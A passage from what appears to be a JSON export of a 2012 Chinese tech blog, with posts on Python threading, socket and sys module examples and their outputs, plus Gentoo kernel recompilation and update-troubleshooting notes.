0.47\n(Thread-1  ) Waiting for lock\n(Thread-1  ) Acquired lock\n(Thread-1  ) Done\n(MainThread) Counter: 4</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "06"
    }
  },
  {
    "id": 228,
    "title": "关于threading研究（二）",
    "category": "python模块研究",
    "tags": [
      "threading"
    ],
    "url": "/archives/guanyuthreadingyanjiuer-2/",
    "content": "<p><pre class=\"sh_python\">\nimport logging\nimport threading\nimport time</p>\n\n<p>logging.basicConfig(level=logging.DEBUG,\n                    format='(%(threadName)-10s) %(message)s',\n                    )</p>\n\n<p>def lock_holder(lock):  #显示资源holding和not holding\n    logging.debug('Starting')\n    while True:\n        lock.acquire()\n        try:\n            logging.debug('Holding')\n            time.sleep(0.5)\n        finally:\n            logging.debug('Not holding')\n            lock.release()\n        time.sleep(0.5)\n    return</p>\n\n<p>def worker(lock):\n    logging.debug('Starting')\n    num_tries = 0\n    num_acquires = 0\n    while num_acquires &lt; 3: #迭代2次，这样就会尝试4次，二次holding，2次not holding\n        time.sleep(0.5)\n        logging.debug('Trying to acquire')\n        have_it = lock.acquire(0)  #找出另一个线程是否已取得当前线程持有锁\n        try:\n            num_tries += 1\n            if have_it:\n                logging.debug('Iteration %d: Acquired',  num_tries)\n                num_acquires += 1\n            else:\n                logging.debug('Iteration %d: Not acquired', num_tries)\n        finally:\n            if have_it:\n                lock.release()\n    logging.debug('Done after %d iterations', num_tries)</p>\n\n<p>lock = threading.Lock()</p>\n\n<p>holder = threading.Thread(target=lock_holder, args=(lock,), name='LockHolder')\nholder.setDaemon(True)\nholder.start()</p>\n\n<p>worker = threading.Thread(target=worker, args=(lock,), name='Worker')\nworker.start()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python !$\npython test.py\n(LockHolder) Starting\n(LockHolder) Holding\n(Worker    ) Starting  #在sleep(0.5)的时候资源被worker获取\n(LockHolder) Not holding\n(Worker    ) Trying to acquire\n(Worker    ) Iteration 1: Acquired\n(LockHolder) Holding\n(Worker    ) Trying to acquire\n(Worker    ) Iteration 2: Not acquired\n(LockHolder) Not holding\n(Worker    ) Trying to acquire\n(Worker    ) Iteration 3: Acquired\n(LockHolder) Holding\n(Worker    ) Trying to acquire\n(Worker    ) Iteration 4: Not acquired\n(LockHolder) Not holding\n(Worker    ) Trying to acquire\n(Worker    ) Iteration 5: Acquired  #第5次因为num_acquires＝3而不进入循环\n(Worker    ) Done after 5 iterations\n<pre class=\"sh_python\">\nimport threading</p>\n\n<p>lock = threading.Lock()</p>\n\n<p>print 'First try :', lock.acquire()  #返回true\nprint 'Second try:', lock.acquire(0)  #资源自能被锁定一次，这里就返回false了</p>\n\n<p>lock = threading.RLock()  #这样可以重新获得锁</p>\n\n<p>print 'First try :', lock.acquire()  #返回true\nprint 'Second try:', lock.acquire(0)  #返回1\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport threading\nimport logging</p>\n\n<p>logging.basicConfig(level=logging.DEBUG,\n                    format='(%(threadName)-10s) %(message)s',\n                    )</p>\n\n<p>def worker_with(lock):\n    with lock:   #使用wit关键字，执行lock的上下文管理\n        logging.debug('Lock acquired via with')</p>\n\n<p>def worker_no_with(lock):\n    lock.acquire()\n    try:\n        logging.debug('Lock acquired directly')\n    finally:\n        lock.release()</p>\n\n<p>lock = threading.Lock()\nw = threading.Thread(target=worker_with, args=(lock,))\nnw = threading.Thread(target=worker_no_with, args=(lock,))</p>\n\n<p>w.start()\nnw.start()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport logging\nimport threading\nimport time</p>\n\n<p>logging.basicConfig(level=logging.DEBUG,\n                    format='%(asctime)s (%(threadName)-2s) %(message)s',  #当前时间\n                    )</p>\n\n<p>def consumer(cond):\n    logging.debug('Starting consumer thread')\n    t = threading.currentThread()\n    with cond:\n        cond.wait()  #释放内部所占用的琐，同时线程被挂起，直至接收到通知被唤醒或超时（如果提供了timeout参数的话）。 \n                     #当线程被唤醒并重新占有琐的时候，程序才会继续执行下去。\n        logging.debug('Resource is available to consumer')</p>\n\n<p>def producer(cond):\n    logging.debug('Starting producer thread')\n    with cond:\n        logging.debug('Making resource available')\n        cond.notifyAll()  #唤醒所有挂起的线程（如果存在挂起的线程），但是这些方法不会释放所占用的琐</p>\n\n<p>condition = threading.Condition()   #它提供了比Lock, RLock更高级的功能，允许我们能够控制复杂的线程同步问题\nc1 = threading.Thread(name='c1', target=consumer, args=(condition,))\nc2 = threading.Thread(name='c2', target=consumer, args=(condition,))\np = threading.Thread(name='p', target=producer, args=(condition,))</p>\n\n<p>c1.start()\ntime.sleep(2)\nc2.start()\ntime.sleep(2)\np.start()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n2012-07-06 14:11:54,001 (c1) Starting consumer thread\n2012-07-06 14:11:56,001 (c2) Starting consumer thread\n2012-07-06 14:11:58,003 (p ) Starting producer thread\n2012-07-06 14:11:58,003 (p ) Making resource available  #producer唤起挂起的线程，触发consumer 线程继续执行\n2012-07-06 14:11:58,003 (c1) Resource is available to consumer\n2012-07-06 14:11:58,004 (c2) Resource is available to consumer\n<pre class=\"sh_python\">\nimport logging\nimport random\nimport threading\nimport time</p>\n\n<p>logging.basicConfig(level=logging.DEBUG,\n                    format='%(asctime)s (%(threadName)-2s) %(message)s',\n                    )</p>\n\n<p>class ActivePool(object):  #跟踪进程执行状态\n    def __init__(self):\n        super(ActivePool, self).__init__()   #保证公共父类仅被执行一次\n        self.active = []\n        self.lock = threading.Lock()\n    def makeActive(self, name):\n        with self.lock:\n            self.active.append(name)\n            logging.debug('Running: %s', self.active)\n    def makeInactive(self, name):\n        with self.lock:\n            self.active.remove(name)\n            logging.debug('Running: %s', self.active)</p>\n\n<p>def worker(s, pool):\n    logging.debug('Waiting to join the pool')\n    with s:\n        name = threading.currentThread().getName()\n        pool.makeActive(name)\n        time.sleep(0.1)\n        pool.makeInactive(name)</p>\n\n<p>pool = ActivePool()\ns = threading.Semaphore(4) ##Semaphore用来控制对共享资源的访问数量，例如池的最大连接数，这里只有4个活动进程同时运行\nfor i in range(4):\n    t = threading.Thread(target=worker, name=str(i), args=(s, pool))\n    t.start()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n2012-07-06 14:19:04,395 (0 ) Waiting to join the pool\n2012-07-06 14:19:04,395 (0 ) Running: ['0']\n2012-07-06 14:19:04,395 (1 ) Waiting to join the pool\n2012-07-06 14:19:04,395 (2 ) Waiting to join the pool\n2012-07-06 14:19:04,395 (3 ) Waiting to join the pool\n2012-07-06 14:19:04,396 (1 ) Running: ['0', '1']\n2012-07-06 14:19:04,396 (2 ) Running: ['0', '1', '2']\n2012-07-06 14:19:04,396 (3 ) Running: ['0', '1', '2', '3']\n2012-07-06 14:19:04,496 (0 ) Running: ['1', '2', '3']\n2012-07-06 14:19:04,496 (1 ) Running: ['2', '3']\n2012-07-06 14:19:04,496 (2 ) Running: ['3']\n2012-07-06 14:19:04,496 (3 ) Running: []</p>\n\n<p><pre class=\"sh_python\">\nimport random\nimport threading\nimport logging</p>\n\n<p>logging.basicConfig(level=logging.DEBUG,\n                    format='(%(threadName)-10s) %(message)s',\n                    )</p>\n\n<p>def show_value(data):\n    try:\n        val = data.value\n    except AttributeError:\n        logging.debug('No value yet')\n    else:\n        logging.debug('value=%s', val)</p>\n\n<p>def worker(data):\n    show_value(data)\n    data.value = random.randint(1, 100)\n    show_value(data)</p>\n\n<p>local_data = threading.local()  #虽然有些资源需要被锁定，所以多个线程可以使用它们,这里创建一个能够隐藏在单独的线程的值对象\nshow_value(local_data)\nlocal_data.value = 1000\nshow_value(local_data)</p>\n\n<p>for i in range(2):\n    t = threading.Thread(target=worker, args=(local_data,))\n    t.start()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n(MainThread) No value yet   #第一次调用还没有设置\n(MainThread) value=1000\n(Thread-1  ) No value yet  #子线程1还没有设置\n(Thread-1  ) value=4 #子线程1设置，但是是本地的属性没有继承1000\n(Thread-2  ) No value yet\n(Thread-2  ) value=55\n<pre class=\"sh_python\">\nimport random\nimport threading\nimport logging</p>\n\n<p>logging.basicConfig(level=logging.DEBUG,\n                    format='(%(threadName)-10s) %(message)s',\n                    )</p>\n\n<p>def show_value(data):\n    try:\n        val = data.value\n    except AttributeError:\n        logging.debug('No value yet')\n    else:\n        logging.debug('value=%s', val)</p>\n\n<p>def worker(data):\n    show_value(data)\n    data.value = random.randint(1, 100)\n    show_value(data)</p>\n\n<p>class MyLocal(threading.local):\n    def __init__(self, value): #初始化设置，让所有的线程具有相同的value\n        logging.debug('Initializing %r', self)\n        self.value = value</p>\n\n<p>local_data = MyLocal(1000)\nshow_value(local_data)</p>\n\n<p>for i in range(2):\n    t = threading.Thread(target=worker, args=(local_data,))\n    t.start()\n</pre>\n执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n(MainThread) Initializing &lt;__main__.MyLocal object at 0x80ff324&gt;\n(MainThread) value=1000\n(Thread-1  ) Initializing &lt;__main__.MyLocal object at 0x80ff324&gt;\n(Thread-1  ) value=1000\n(Thread-1  ) value=42\n(Thread-2  ) Initializing &lt;__main__.MyLocal object at 0x80ff324&gt;  #实例的对象id都是一样的\n(Thread-2  ) value=1000\n(Thread-2  ) value=64</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "06"
    }
  },
  {
    "id": 229,
    "title": "gentoo笔记（十二）重新编译内核总结",
    "category": "gentoo",
    "tags": [

    ],
    "url": "/archives/gentoobijishierzhongxinbianyineihezongjie/",
    "content": "<p>前言：最初使用了genkernel配置的内核，因为默认不支持高内存支持，我的系统只识别了886M内存（本来是4G），那么需要修改内核重新编译，以下是总结的过程：</p>\n\n<p>1 切换到内核源码目录，其实这是一个真正地址的软连接地址\ncd /usr/src/linux\n2 配置内核\ngenkernel --menuconfig  all #--bootloader=grub表示自动更新grub引导程序配置,个人不建议使用，因为他可能会改错grub\n注：其实还是genkernel自动配置内核，而不是make menuconfig+make &amp;&amp; make modules_install+cp arch/i386/boot/bzImage /boot/kernel-ＸＸ-gentoo，\n但是事实上--menuconfig在自动配置前也会弹出那个菜单，让你自定义选择。我尝试了make menuconfig手动配置，但是因为硬件等原因，\n出现了很多错误，还不如直接使用genkernel全部配置，再小范围修改，比如我这里修改了支持4Ｇ内存的选项等（默认是ＯＦＦ）</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "09"
    }
  },
  {
    "id": 230,
    "title": "gentoo笔记（十三）更新系统的总结和报错解决",
    "category": "gentoo",
    "tags": [

    ],
    "url": "/archives/gentoobijishisangengxinxitongdebaocuojiejue/",
    "content": "<p>升级步骤：</p>\n\n<p>1 emerge -–sync ＃同步更新目录\n2 emerge portage ＃更新portage\n3 emerge python ＃更新python，这属于个人习惯\n4 python-updater ＃更新python配置\n5 emerge -aDjNquv @world ＃升级整个系统（包括依赖）,-D 表示-deep,－j不加参数表示不限制同时运行的emerge进程（模式是1）</p>\n\n<p>#－N表示查看每个包的可用的USE参数，－q表示减少显示器屏幕输出，－u表示 --update ,-v表示详细模式\n6 emerge -av –depclean ＃清除不需要的软件包\n7 revdep-rebuild ＃检查系统依赖关系自动安装不满足的 关系包,假如过程中出现错误，重新 执行还是过去的包数量，</p>\n\n<p>#这是因为对需要重新安装的依赖包的数据缓存了，可以删除：rm /var/cache/revdep-rebuild/*.rr\n8 dispatch-conf或etc-update ＃更新系统配置文件</p>\n\n<p>9 （可选）emerge -ej world #重新编译系统，假如USE修改不大就不需要</p>\n\n<p>1 [blocks B ] 原因：说明小于sys-libs/talloc-2.0.5的包被sys-libs/talloc-2.0.7被屏蔽了，需要卸载重装新版本\n解决：dongwm@localhost ~ $sudo emerge -C talloc &amp;&amp; sudo emerge -1 talloc\n2 !!! The following updates are masked by LICENSE changes: - www-plugins/adobe-flash-11.2.202.236\n原因：这是adobe-flash造成的阻止安装，需要手动容许这个LICENSE\n解决：echo \"www-plugins/adobe-flash AdobeFlash-10.3\" &gt;&gt; /etc/portage/package.license #其中的10.3是报错提示信息重提到的</p>\n\n<p>3 !!! One of the following masked packages is required to complete your request:\n- x11-plugins/compiz-plugins-extra-0.8.8::gentoo (masked by: corruption)</p>\n\n<p>原因：主要是权限问题,本来更新portage后不存在这个ebuild，但是依赖关系又需要，所以去http://gpo.zugaina.org/x11-plugins/compiz-plugins-extra下载了一个相应版本，其他的地址，你懂的!</p>\n\n<p>解决：ebuild compiz-plugins-extra-0.8.8.ebuild digest</p>\n\n<p>4 emerge: there are no ebuilds built with USE flags to satisfy \"&gt;=x11-libs/libdrm-2.4.24[video_cards_nouveau]\".\n!!! One of the following packages is required to complete your request:\n- x11-libs/libdrm-2.4.33::gentoo (Change USE: +video_cards_nouveau)</p>\n\n<p>原因：需要指定一个USE标识，可以直接在安装指定\n解决：这样安装：USE=video_cards_nouveau emerge  x11-drivers/xf86-video-nouveau 或者给某个包一个特定的USE到/etc/portage/package.use，这里也就是添加一行：</p>\n\n<p>x11-drivers/xf86-video-nouveau video_cards_nouveau\n5The following REQUIRED_USE flag constraints are unsatisfied:</p>\n\n<p>osdmenu? ( X ) xscreensaver? ( X ) xv? ( X )</p>\n\n<p>原因：说明USE包括osdmenu对其他标识有影响</p>\n\n<p>解决：需要去掉，或者'-osdmenu'</p>\n\n<p>6 /usr/lib/gcc/i686-pc-linux-gnu/4.5.3/../../../../i686-pc-linux-gnu/bin/ld: warning: libxcb-util.so.0, needed by /usr/lib/gcc/i686-pc-linux-gnu/4.5.3/../../../../lib/libstartup-notification-1.so, not found (try using -rpath or -rpath-link)(安装时)</p>\n\n<p>原因： libxcb-util的动态链接有问题</p>\n\n<p>解决：需要重新emerge x11-libs/xcb-util, x11-libs/libxc 然后 revdep-rebuild重建依赖关系</p>\n\n<p>7 Traceback (most recent call last):\nFile \"configure.py\", line 32, in &lt;module&gt;\nimport sipconfig\nImportError: No module named sipconfig\n* ERROR: dev-python/PyQt4-4.9.1 failed (configure phase):\n*   (no error message)\n原因：安装qt需要sip</p>\n\n<p>解决：重新安装dev-python/sip\n</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "09"
    }
  },
  {
    "id": 231,
    "title": "关于socket研究(二)",
    "category": "python模块研究",
    "tags": [
      "socket"
    ],
    "url": "/archives/guanyusocketyanjiuer-2/",
    "content": "<p>socket服务器端：</p>\n\n<p><pre class=\"sh_python\">\nimport socket\nimport sys</p>\n\n<p>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   #socket.AF_INET表示类型是ipv4，SOCK_STREAM提供面向连接的稳定数据传输，即TCP协议.相应的ＵＤＰ就是<span><em>SOCK_DGRAM</em></span>\nserver_address = ('localhost', 10000) \nprint &gt;&gt;sys.stderr, 'starting up on %s port %s' % server_address\nsock.bind(server_address)  #绑定到本地的10000端口\nsock.listen(1) #使用主动连接套接口变为被连接套接口，使得一个进程可以接受其它进程的请求，从而成为一个服务器进程。指定最多允许1个客户连接到服务器</p>\n\n<p>while True:\n    print &gt;&gt;sys.stderr, 'waiting for a connection'\n    connection, client_address = sock.accept() #在listen()后监听连接\n    try:\n        print &gt;&gt;sys.stderr, 'connection from', client_address</p>\n\n<p>        while True:  #等待收到数据后。。。\n            data = connection.recv(16) #从TCP连接的另一端接收数据，缓存区为16\n            print &gt;&gt;sys.stderr, 'received \"%s\"' % data\n            if data:\n                print &gt;&gt;sys.stderr, 'sending data back to the client'\n                connection.sendall(data)\n            else:\n                print &gt;&gt;sys.stderr, 'no more data from', client_address\n                break</p>\n\n<p>    finally:\n        connection.close()   #关闭socket连接\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport socket\nimport sys</p>\n\n<p>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建socket连接</p>\n\n<p>server_address = ('localhost', 10000)\nprint &gt;&gt;sys.stderr, 'connecting to %s port %s' % server_address\nsock.connect(server_address)  #连接到socket服务器的端口\ntry:\n    message = 'This is the message.  It will be repeated.'\n    print &gt;&gt;sys.stderr, 'sending \"%s\"' % message\n    sock.sendall(message)  #<code>send()</code>和 <code>.sendall()</code> 之间做出选择。前者一次发送尽可能多的字节数，后者发送整个报文（如果不能发送就会引发一个异常）\n    amount_received = 0\n    amount_expected = len(message)</p>\n\n<p>    while amount_received &lt; amount_expected:\n        data = sock.recv(16)\n        amount_received += len(data)\n        print &gt;&gt;sys.stderr, 'received \"%s\"' % data</p>\n\n<p>finally:\n    print &gt;&gt;sys.stderr, 'closing socket'\n    sock.close()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport socket\nimport sys</p>\n\n<p>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #创建一个ｕｄｐ的socket连接\nserver_address = ('localhost', 10000)\nprint &gt;&gt;sys.stderr, 'starting up on %s port %s' % server_address\nsock.bind(server_address)\nwhile True:\n    print &gt;&gt;sys.stderr, '\\nwaiting to receive message'\n    data, address = sock.recvfrom(4096)  #udp使用recvfrom接收</p>\n\n<p>    print &gt;&gt;sys.stderr, 'received %s bytes from %s' % (len(data), address)\n    print &gt;&gt;sys.stderr, data</p>\n\n<p>    if data:\n        sent = sock.sendto(data, address)  #udp使用sendto发送\n        print &gt;&gt;sys.stderr, 'sent %s bytes back to %s' % (sent, address)\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport socket\nimport sys</p>\n\n<p>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  #udp的socket客户端</p>\n\n<p>server_address = ('localhost', 10000)\nmessage = 'This is the message.  It will be repeated.'</p>\n\n<p>try:</p>\n\n<p>    print &gt;&gt;sys.stderr, 'sending \"%s\"' % message\n    sent = sock.sendto(message, server_address)</p>\n\n<p>    print &gt;&gt;sys.stderr, 'waiting to receive'\n    data, server = sock.recvfrom(4096)\n    print &gt;&gt;sys.stderr, 'received \"%s\"' % data</p>\n\n<p>finally:\n    print &gt;&gt;sys.stderr, 'closing socket'\n    sock.close()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport socket\nimport sys\nimport os</p>\n\n<p>server_address = './uds_socket'  #一个socket文件</p>\n\n<p>try:\n    os.unlink(server_address)  #确保这个文件本来不存在\nexcept OSError:\n    if os.path.exists(server_address):\n        raise\nsock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)  #创建一个unix domain socket\nprint &gt;&gt;sys.stderr, 'starting up on %s' % server_address\nsock.bind(server_address)\nsock.listen(1)\nwhile True:\n    print &gt;&gt;sys.stderr, 'waiting for a connection'\n    connection, client_address = sock.accept()\n    try:\n        print &gt;&gt;sys.stderr, 'connection from', client_address\n        while True:\n            data = connection.recv(16)\n            print &gt;&gt;sys.stderr, 'received \"%s\"' % data\n            if data:\n                print &gt;&gt;sys.stderr, 'sending data back to the client'\n                connection.sendall(data)\n            else:\n                print &gt;&gt;sys.stderr, 'no more data from', client_address\n                break</p>\n\n<p>    finally:\n        connection.close()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport socket\nimport sys</p>\n\n<p>sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)  #unix domain socket客户端</p>\n\n<p>server_address = './uds_socket'\nprint &gt;&gt;sys.stderr, 'connecting to %s' % server_address\ntry:\n    sock.connect(server_address)\nexcept socket.error, msg:\n    print &gt;&gt;sys.stderr, msg\n    sys.exit(1)</p>\n\n<p>try:</p>\n\n<p>    message = 'This is the message.  It will be repeated.'\n    print &gt;&gt;sys.stderr, 'sending \"%s\"' % message\n    sock.sendall(message)\n    amount_received = 0\n    amount_expected = len(message)\n    while amount_received &lt; amount_expected:\n        data = sock.recv(16)\n        amount_received += len(data)\n        print &gt;&gt;sys.stderr, 'received \"%s\"' % data\nfinally:\n    print &gt;&gt;sys.stderr, 'closing socket'\n    sock.close()\n</pre></p>\n\n<p>注：这个socket文件需要注意权限：</p>\n\n<p>dongwm@localhost ~ $ls -l !$\nls -l uds_socket\nsrwxr-xr-x 1 dongwm dongwm 0  7月  9 12:46 uds_socket\n假如你没有权限，那么会告诉你：connecting to ./uds_socket [Errno 13] Permission denied</p>\n\n<p><pre class=\"sh_python\">\nimport socket\nimport os</p>\n\n<p>parent, child = socket.socketpair()  #socket父子进程之间通信</p>\n\n<p>pid = os.fork()</p>\n\n<p>if pid:\n    print 'in parent, sending message'\n    child.close()\n    parent.sendall('ping')\n    response = parent.recv(1024)\n    print 'response from child:', response\n    parent.close()</p>\n\n<p>else:\n    print 'in child, waiting for message'\n    parent.close()\n    message = child.recv(1024)\n    print 'message from parent:', message\n    child.sendall('pong')\n    child.close()\n</pre>\n执行结果：</p>\n\n<p>dongwm@localhost ~ $python test.py\nin parent, sending message\nin child, waiting for message\nmessage from parent: ping\nresponse from child: pong</p>\n\n<p><pre class=\"sh_python\">\nimport socket\nimport struct\nimport sys</p>\n\n<p>message = 'very important data'\nmulticast_group = ('224.3.29.71', 10000)\n#在发送者和每一接收者之间实现点对多点网络连接。如果一台发送者同时给多个的接收者传输相同的数据，也只需复制一份的相同数据包。它提高了数据传送效率。减少了骨干网络出现拥塞的可能性\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #创建socket，用来接收，这个程序可以运行在多个ＩＰ上面，组播只能用ＵＤＰ\nsock.settimeout(0.2) #设置超时\nttl = struct.pack('b', 1)\nsock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)  #设置组播\ntry:</p>\n\n<p>    print &gt;&gt;sys.stderr, 'sending \"%s\"' % message\n    sent = sock.sendto(message, multicast_group)\n    while True:\n        print &gt;&gt;sys.stderr, 'waiting to receive'\n        try:\n            data, server = sock.recvfrom(16)\n        except socket.timeout:\n            print &gt;&gt;sys.stderr, 'timed out, no more responses'\n            break\n        else:\n            print &gt;&gt;sys.stderr, 'received \"%s\" from %s' % (data, server)\nfinally:\n    print &gt;&gt;sys.stderr, 'closing socket'\n    sock.close()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport socket\nimport struct\nimport sys</p>\n\n<p>multicast_group = '224.3.29.71'\nserver_address = ('', 10000)\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #这个程序发送组播数据\nsock.bind(server_address)  #绑定组播地址\ngroup = socket.inet_aton(multicast_group) \nmreq = struct.pack('4sL', group, socket.INADDR_ANY)\nsock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq) #告诉系统在所有接口增加这个socket到组播组\nwhile True:\n    print &gt;&gt;sys.stderr, '\\nwaiting to receive message'\n    data, address = sock.recvfrom(1024)</p>\n\n<p>    print &gt;&gt;sys.stderr, 'received %s bytes from %s' % (len(data), address)\n    print &gt;&gt;sys.stderr, data</p>\n\n<p>    print &gt;&gt;sys.stderr, 'sending acknowledgement to', address\n    sock.sendto('ack', address)\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>ｉｐ1(192.168.8.49)：</p>\n\n<p>[htdocs@debian ~]$ python test.py</p>\n\n<p>waiting to receive message\nreceived 19 bytes from ('192.168.8.48', 59274)\nvery important data\nsending acknowledgement to ('192.168.8.48', 59274)</p>\n\n<p>waiting to receive message\nｉｐ2（192.168.8.48）:</p>\n\n<p>dongwm@localhost ~ $python test1.py</p>\n\n<p>waiting to receive message\nreceived 19 bytes from ('192.168.8.48', 59274)\nvery important data\nsending acknowledgement to ('192.168.8.48', 59274)</p>\n\n<p>waiting to receive message\n发送端（192.168.8.48）：</p>\n\n<p>dongwm@localhost ~ $python test.py\nsending \"very important data\"\nwaiting to receive\nreceived \"ack\" from ('192.168.8.48', 10000)\nwaiting to receive\nreceived \"ack\" from ('192.168.8.49', 10000)\nwaiting to receive\ntimed out, no more responses\nclosing socket\n<pre class=\"sh_python\">\nimport binascii\nimport socket\nimport struct\nimport sys</p>\n\n<p>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_address = ('localhost', 10000)\nsock.bind(server_address)\nsock.listen(1)</p>\n\n<p>unpacker = struct.Struct('I 2s f')</p>\n\n<p>while True:\n    print &gt;&gt;sys.stderr, '\\nwaiting for a connection'\n    connection, client_address = sock.accept()\n    try:\n        data = connection.recv(unpacker.size) \n        print &gt;&gt;sys.stderr, 'received \"%s\"' % binascii.hexlify(data) #收到的二进制数据</p>\n\n<p>        unpacked_data = unpacker.unpack(data)\n        print &gt;&gt;sys.stderr, 'unpacked:', unpacked_data  #数据解包</p>\n\n<p>    finally:\n        connection.close()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport binascii\nimport socket\nimport struct\nimport sys</p>\n\n<p>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_address = ('localhost', 10000)\nsock.connect(server_address)</p>\n\n<p>values = (1, 'ab', 2.7)\npacker = struct.Struct('I 2s f')\npacked_data = packer.pack(*values) #压包</p>\n\n<p>try:\n    print &gt;&gt;sys.stderr, 'sending \"%s\"' % binascii.hexlify(packed_data), values\n    sock.sendall(packed_data)</p>\n\n<p>finally:\n    print &gt;&gt;sys.stderr, 'closing socket'\n    sock.close()\n</pre>\n执行结果：</p>\n\n<p>dongwm@localhost ~ $python !$\npython server.py  #接收端</p>\n\n<p>waiting for a connection\nreceived \"0100000061620000cdcc2c40\"\nunpacked: (1, 'ab', 2.700000047683716)</p>\n\n<p>waiting for a connection\ndongwm@localhost ~ $python test.py  #发送端\nsending \"0100000061620000cdcc2c40\" (1, 'ab', 2.7)\nclosing socket</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "09"
    }
  },
  {
    "id": 232,
    "title": "关于sys研究（二）",
    "category": "python模块研究",
    "tags": [

    ],
    "url": "/archives/guanyusysyanjiuer/",
    "content": "<p><pre class=\"sh_python\">\nimport sys\nprint 'Arguments:', sys.argv #命令行参数\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~ python test.py -h\nArguments: ['test.py', '-h']\n<pre class=\"sh_python\">\nimport sys</p>\n\n<p>print sys.stderr, 'STATUS: Reading from stdin' #<tt>stderr</tt>被用于警告或错误信息使用</p>\n\n<p>data = sys.stdin.read()  #输入流保存</p>\n\n<p>print sys.stderr, 'STATUS: Writing data to stdout'</p>\n\n<p>sys.stdout.write(data) #打印数据\nsys.stdout.flush() #将stdout实时自动刷出来</p>\n\n<p>print sys.stderr, 'STATUS: Done'\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport sys</p>\n\n<p>exit_code = int(sys.argv[1])\nsys.exit(exit_code) #设置退出时候的code，正常执行是0，不正常就是非0\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport sys</p>\n\n<p>one = []\nprint 'At start         :', sys.getrefcount(one) #Python使用<em>引用计数</em>和<em>垃圾收集</em>的自动内存管理。一个对象被自动标记被收集时，它的引用计数下降到零,使用<tt>getrefcount（）</tt>审查现有对象的引用计数\n<tt></tt>two = one\nprint 'Second reference :', sys.getrefcount(one)\ndel two\nprint 'After del        :', sys.getrefcount(one)\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nAt start         : 2\nSecond reference : 3\nAfter del        : 2\n<pre class=\"sh_python\">\nimport sys</p>\n\n<p>class OldStyle:\n    pass</p>\n\n<p>class NewStyle(object):\n    pass</p>\n\n<p>for obj in [ [], (), {}, 'c', 'string', 1, 2.3, \n             OldStyle, OldStyle(), NewStyle, NewStyle(),\n             ]:    \n    print '%10s : %s' % (type(obj).__name__, sys.getsizeof(obj)) #各种类型对象的大小\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nlist : 32\ntuple : 24\ndict : 136\nstr : 25\nstr : 30\nint : 12\nfloat : 16\nclassobj : 44\ninstance : 32\ntype : 448\nNewStyle : 28\n<pre class=\"sh_python\">\nimport sys</p>\n\n<p>class WithoutAttributes(object):\n    pass</p>\n\n<p>class WithAttributes(object):\n    def __init__(self):\n        self.a = 'a'\n        self.b = 'b'\n        return</p>\n\n<p>without_attrs = WithoutAttributes()\nprint 'WithoutAttributes:', sys.getsizeof(without_attrs)</p>\n\n<p>with_attrs = WithAttributes()\nprint 'WithAttributes:', sys.getsizeof(with_attrs)\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nWithoutAttributes: 28\nWithAttributes: 28 #带属性的和不带属性的类竟然一样大看下面的例子，通过聚合对象的 属性的大小来计算：</p>\n\n<p><pre class=\"sh_python\">\nimport sys</p>\n\n<p>class WithAttributes(object):\n    def __init__(self):\n        self.a = 'a'\n        self.b = 'b'\n        return\n    def __sizeof__(self):\n        return object.__sizeof__(self) + \\\n            sum(sys.getsizeof(v) for v in self.__dict__.values())</p>\n\n<p>my_inst = WithAttributes()\nprint sys.getsizeof(my_inst)\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\n78  #这样就不是28，这样就合理了</p>\n\n<p><pre class=\"sh_python\">\nimport sys</p>\n\n<p>print 'Initial limit:', sys.getrecursionlimit()  #得到递归的次数，要不然不停的自己调用自己会引起崩溃\nsys.setrecursionlimit(10) #设置递归的次数</p>\n\n<p>print 'Modified limit:', sys.getrecursionlimit()</p>\n\n<p>def generate_recursion_error(i):\n    print 'generate_recursion_error(%s)' % i\n    generate_recursion_error(i+1) #不断的递归调用自己，但是计数加+1</p>\n\n<p>try:\n    generate_recursion_error(1)\nexcept RuntimeError, err:\n    print 'Caught exception:', err\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nInitial 